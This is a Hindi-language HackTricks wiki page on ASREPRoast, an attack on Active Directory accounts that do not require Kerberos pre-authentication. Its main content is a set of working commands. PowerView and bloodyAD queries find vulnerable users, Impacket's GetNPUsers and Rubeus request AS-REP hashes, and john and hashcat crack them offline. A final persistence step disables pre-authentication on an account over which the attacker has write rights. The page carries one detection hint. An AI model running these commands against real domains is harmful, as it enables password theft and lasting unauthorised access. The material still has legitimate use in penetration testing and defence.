# ASREPRoast

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **हमें** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) सर्वर में शामिल होकर अनुभवी हैकर्स और बग बाउंटी हंटर्स के साथ संवाद करें!

**हैकिंग इंसाइट्स**\
उस सामग्री के साथ जुड़ें जो हैकिंग के रोमांच और चुनौतियों में डूबती है

**रियल-टाइम हैक न्यूज़**\
तेजी से बदलती हैकिंग दुनिया के साथ कदम से कदम रहें अपडेट के साथ

**नवीनतम घोषणाएं**\
नवीनतम बग बाउंटी लॉन्च और महत्वपूर्ण प्लेटफॉर्म अपडेट के साथ सूचित रहें

**हमारे साथ जुड़ें** [**Discord**](https://discord.com/invite/N3FrSbmwdy) और आज ही शीर्ष हैकर्स के साथ सहयोग करना शुरू करें!

## ASREPRoast

ASREPRoast एक सुरक्षा हमला है जो उन उपयोगकर्ताओं का शोषण करता है जिनके पास **Kerberos पूर्व-प्रमाणीकरण आवश्यक विशेषता** नहीं है। मुख्य रूप से, यह दुर्बलता हमला हैकर्स को उपयोगकर्ता के लिए डोमेन कंट्रोलर (DC) से प्रमाणीकरण का अनुरोध करने की अनुमति देता है बिना उपयोगकर्ता के पासवर्ड की आवश्यकता के। फिर DC उपयोगकर्ता के पासवर्ड से निर्धारित कुंजी से एन्क्रिप्ट किए गए संदेश के साथ प्रतिक्रिया करता है, जिसे हैकर्स ऑफलाइन क्रैक करने की कोशिश कर सकते हैं ताकि वे उपयोगकर्ता का पासवर्ड खोज सकें।

इस हमले के मुख्य आवश्यकताएँ हैं:
- **Kerberos पूर्व-प्रमाणीकरण की कमी**: लक्षित उपयोगकर्ताओं को इस सुरक्षा सुविधा को सक्रिय करने की आवश्यकता नहीं है।
- **डोमेन कंट्रोलर (DC) से कनेक्शन**: हैकर्स को DC तक पहुंचने की आवश्यकता है ताकि वे अनुरोध भेज सकें और एन्क्रिप्टेड संदेश प्राप्त कर सकें।
- **वैकल्पिक डोमेन खाता**: डोमेन खाता होने से हैकर्स को LDAP क्वेरी के माध्यम से विकल्पशील उपयोगकर्ताओं की पहचान करने में अधिक प्रभावी होता है। इस तरह के खाते के बिना, हैकर्स को उपयोगकर्ता नामों का अनुमान लगाना होगा।


#### विकल्पी उपयोगकर्ताओं की गणना (डोमेन क्रेडेंशियल्स की आवश्यकता है)

{% code title="Windows का उपयोग करके" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="लिनक्स का उपयोग करना" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS\_REP संदेश का अनुरोध करें

{% code title="Linux का उपयोग करें" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Windows का उपयोग करना" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting के साथ Rubeus का उपयोग करने पर एक 4768 उत्पन्न होगा जिसमें एन्क्रिप्शन प्रकार 0x17 और पूर्व-प्रमाणीकरण प्रकार 0 होगा।
{% endhint %}

### क्रैकिंग
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

एक उपयोगकर्ता के लिए **GenericAll** अनुमतियों (या गुणों को लिखने की अनुमति) होने पर **preauth** को बाध्य न करें:

{% code title="Windows का उपयोग करना" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="लिनक्स का उपयोग करें" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## संदर्भ

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) सर्वर में शामिल होकर अनुभवी हैकर्स और बग बाउंटी हंटर्स के साथ संवाद करें!

**हैकिंग इंसाइट्स**\
हैकिंग के रोमांच और चुनौतियों में डूबने वाली सामग्री के साथ जुड़ें

**रियल-टाइम हैक न्यूज़**\
रियल-टाइम समाचार और अंदरूनी दुनिया के साथ अप-टू-डेट रहें

**नवीनतम घोषणाएं**\
नवीनतम बग बाउंटी लॉन्च और महत्वपूर्ण प्लेटफॉर्म अपडेट के साथ सूचित रहें

[**Discord**](https://discord.com/invite/N3FrSbmwdy) पर हमारे साथ जुड़ें और आज ही शीर्ष हैकर्स के साथ सहयोग करना शुरू करें!

<details>

<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके अपने हैकिंग ट्रिक्स साझा करें।

</details>
